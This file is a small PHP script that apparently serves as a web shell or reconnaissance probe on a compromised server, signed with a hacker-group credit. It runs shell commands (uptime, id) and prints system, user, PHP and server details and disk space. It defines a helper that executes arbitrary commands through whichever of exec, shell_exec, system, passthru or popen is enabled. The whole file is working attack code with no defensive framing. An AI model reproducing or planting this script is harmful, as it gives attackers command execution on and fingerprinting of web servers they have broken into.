<?
echo "ALBANIA<br>";
$alb = @php_uname();
$alb2 = system(uptime);
$alb3 = system(id);
$alb4 = @getcwd();
$alb5 = getenv("SERVER_SOFTWARE");
$alb6 = phpversion();
$alb7 = $_SERVER['SERVER_NAME'];
$alb8 = $_SERVER['SERVER_ADDR'];
$alb9 = get_current_user();
$os = @PHP_OS;
echo "UNITED #D-Devils By The King Sir|ToTTi<br>";
echo "os: $os<br>";
echo "uname -a: $alb<br>";
echo "uptime: $alb2<br>";
echo "id: $alb3<br>";
echo "pwd: $alb4<br>";
echo "SoftWare: $alb5<br>";
echo "user: $alb9<br>";
echo "PHPV: $alb6<br>";
echo "ServerName: $alb7<br>";
echo "ServerAddr: $alb8<br>";
$free = disk_free_space($dir); 
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
if ($free === FALSE) {$free = 0;} 
if ($free < 0) {$free = 0;} 
echo "Free:".view_size($free)."<br>"; 
echo "TotalSpace".view_size($all)."</b>";
$cmd="id";
$eseguicmd=ex($cmd);
echo $eseguicmd;
function ex($cfe){
$res = '';
if (!empty($cfe)){
if(function_exists('exec')){
@exec($cfe,$res);
$res = join("\n",$res);
}
elseif(function_exists('shell_exec')){
$res = @shell_exec($cfe);
}
elseif(function_exists('system')){
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(function_exists('passthru')){
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(@is_resource($f = @popen($cfe,"r"))){
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
}}
return $res;
}
function view_size($size) 
{ 
 if (!is_numeric($size)) {return FALSE;} 
 else 
 { 
  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";} 
  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";} 
  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";} 
  else {$size = $size . " B";} 
  return $size; 
 } 
} 
exit;
?>
